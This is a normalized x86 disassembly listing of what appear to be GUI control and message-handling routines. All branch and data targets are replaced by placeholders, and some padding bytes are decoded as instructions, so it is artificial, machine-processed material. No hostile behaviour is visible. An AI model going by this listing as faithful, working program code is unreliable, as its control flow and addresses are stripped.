call sub_4125d4
call sub_412550
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_412550
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_4727dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x60 ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x60 ]
setne al
pop ebp
retn
sub_472810
push ebp
mov ebp esp
push ebx
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x194 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x194 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5d ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x198 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x198 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x194 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x63 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5d ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x19c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x19c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x44 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x63 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5d ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x1a0 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x1a0 ]
jne r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x63 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5d ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1a0 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x63 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub_472a30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0x8 ]
mov eax [ ebx ]
push eax
push r-xdata
mov eax [ ebx ]
push eax
push sub_4727d0
push ebp
call sub_4727dc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_47412c
mov eax [ ebx ]
push eax
push sub_4740c4
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
xor ecx ecx
jmp r-xdata
push ebp
xor eax eax
call sub_472810
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_4740fc
mov eax [ ebx ]
push eax
push sub_4740a4
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x1
call sub_472810
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_4740d4
mov eax [ ebx ]
push eax
push sub_4740ec
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x2
call sub_472810
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_474114
mov eax [ ebx ]
push eax
push sub_4740b4
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x3
call sub_472810
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov cl 0x1
sub_472ca8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x2 ] cx
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x2 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_472ce0
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
test [ esi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax esi
call sub_4721e0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ edi + 0x4 ]
call sub_49450c
or ax [ ebp + 0x8 ]
push eax
call sub_46d294
pop ecx
or cx ax
movzx edx [ ebp - 0x1 ]
mov eax esi
mov si 0xffd5
call sub_40587c
jmp r-xdata
cmp [ esi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ edi + 0x8 ]
push eax
movsx eax [ edi + 0xa ]
push eax
movzx eax [ edi + 0x4 ]
call sub_49450c
or ax [ ebp + 0x8 ]
push eax
call sub_46d294
pop ecx
or cx ax
movzx edx [ ebp - 0x1 ]
mov eax esi
mov si 0xffd5
call sub_40587c
sub_472d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4709bc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4710a4
movzx eax [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_472ce0
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_472dc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4709bc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_472de4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4709bc
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4710a4
movzx eax [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_472ce0
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffeb
call sub_40587c
sub_472e3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_472180
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5e ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_472114
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_472180
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_472ed8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_472ce0
pop esi
pop ebx
retn
sub_472f02
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_472ce0
pop esi
pop ebx
retn
sub_472f29
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_472ce0
pop esi
pop ebx
retn
sub_472f5a
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_472ce0
pop esi
pop ebx
retn
sub_472f81
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x2 ] dx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
movzx ecx [ ebp - 0x2 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_472fbc
push esi
push edi
add esp 0xfffffff8
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ esi + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
retn
cmp [ esi + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax esi
call sub_4721e0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ edi + 0x4 ]
call sub_49450c
push eax
call sub_46d294
pop edx
or dx ax
mov ecx [ esp + 0x4 ]
mov eax esi
mov si 0xffd4
call sub_40587c
jmp r-xdata
cmp [ esi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ edi + 0xa ]
push eax
movzx eax [ edi + 0x4 ]
call sub_49450c
push eax
call sub_46d294
pop edx
or dx ax
movsx ecx [ edi + 0x8 ]
mov eax esi
mov si 0xffd4
call sub_40587c
sub_473044
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x2 ] cx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x2 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_47307c
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
test [ esi + 0x51 ] 0x10
jne r-xdata
pop edx
pop edi
pop esi
retn
movsx eax [ edi + 0x8 ]
push eax
movsx eax [ edi + 0xa ]
push eax
movzx eax [ edi + 0x4 ]
call sub_49450c
push eax
call sub_46d294
pop ecx
or cx ax
movzx edx [ esp + 0x8 ]
mov eax esi
mov si 0xffd3
call sub_40587c
sub_4730c0
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_4710a4
mov edx edi
xor ecx ecx
mov eax ebx
call sub_47307c
add esp 0x1c
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffffffd
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0xc ]
lea edx [ esp + 0x4 ]
call sub_40abd8
test al al
je r-xdata
mov eax ebx
mov si 0xffec
call sub_40587c
sub_47313c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_47307c
pop esi
pop ebx
retn
sub_47315c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_47307c
pop esi
pop ebx
retn
sub_47317c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x4 ]
call sub_49450c
mov [ ebx + 0x4 ] ax
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40587c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_47f9f4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4731d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_471094
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffffffe
xor edx edx
mov eax esi
call sub_4710a4
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_472314
pop esi
retn
sub_473210
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x70 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_472398
sub_4732be
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x59 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_471304
mov cl 0x1
sub_47330c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x6c ]
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x6c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x5c ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0xb00d
call sub_472314
sub_473344
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x6c ]
call sub_47330c
pop ecx
push ebp
mov eax [ edx + 0x8 ]
call sub_47330c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x5c ] 0x1
sub_473380
push ebx
mov ebx eax
cmp [ ebx + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov [ ebx + 0x62 ] 0x1
movzx edx [ eax + 0x61 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x80 ]
sub_4733a4
push ebx
push esi
push edi
add esp 0xfffffff4
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push eax
movsx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x4 ]
mov eax edi
mov si 0xffe4
call sub_40587c
test al al
je r-xdata
mov esi [ edi + 0x34 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_472314
mov [ ebx + 0xc ] eax
sub_473414
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x15a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
push esp
mov eax [ esi + 0x8 ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
cmp [ esp ] 0x0
je r-xdata
mov ecx esp
mov eax [ esi + 0x8 ]
mov edx eax
mov eax ebx
mov edi [ eax ]
call [ edi + 0x44 ]
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
push eax
xor ecx ecx
mov edx 0xb052
mov eax [ ebx + 0x34 ]
call sub_472314
sub_4734a4
push ebx
mov ebx eax
cmp [ ebx + 0x8a ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
mov edx [ ebx + 0x34 ]
test [ edx + 0x1c ] 0x10
setne dl
cmp al dl
jne r-xdata
mov eax [ ebx + 0x34 ]
movzx edx [ eax + 0x89 ]
mov eax ebx
call sub_470fa8
mov [ ebx + 0x8a ] 0x1
sub_4734e0
push ebx
mov ebx eax
cmp [ ebx + 0x5b ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
mov edx [ eax + 0x64 ]
mov eax ebx
call sub_470f4c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_470f4c
jmp r-xdata
mov [ ebx + 0x5b ] 0x1
sub_47353c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb013
call sub_472314
pop esi
pop ebx
retn
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebx + 0x89 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_472370
test eax eax
je r-xdata
mov eax ebx
call sub_472370
mov edx ebx
call sub_480e20
sub_4735a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb014
call sub_472314
pop esi
pop ebx
retn
cmp [ ebx + 0x132 ] 0x0
je r-xdata
cmp [ ebx + 0x89 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_472370
test eax eax
je r-xdata
mov eax ebx
call sub_472370
mov edx ebx
call sub_480b88
sub_47360c
push ebx
mov ebx eax
mov eax [ ebx + 0xac ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x34 ]
test edx edx
je r-xdata
mov eax [ ebx + 0xac ]
mov [ eax + 0x18 ] 0x1
mov edx [ edx + 0xac ]
movzx edx [ edx + 0x1e ]
call sub_481b14
sub_473640
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x64 ]
test eax eax
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x64 ]
mov ecx [ esi ]
mov edx ecx
cmp eax edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x64 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_47046c
mov edx [ esp ]
mov eax ebx
call sub_470438
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax ebx
call sub_470764
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax ebx
call sub_4707a4
sub_4736dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov eax [ eax + 0x40 ]
mov edx [ edi ]
mov edx [ edx + 0x44 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax [ edi ]
mov eax [ eax + 0x34 ]
call sub_47085c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x4c ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x34 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_40ac8c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_470710
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473764
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_473640
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x14 ] ebx
mov eax ebx
call sub_479ce0
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_4736dc
pop ecx
jmp r-xdata
sub_4737c4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4738b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4738bb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_470e88
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_470e50
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_470e50
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_407768
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_4070a8
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_470d70
cmp [ esi + 0x59 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x110 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x114 ] eax
cmp [ esi + 0x112 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4738c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xfff0
call sub_40587c
sub_4738f0
push ebx
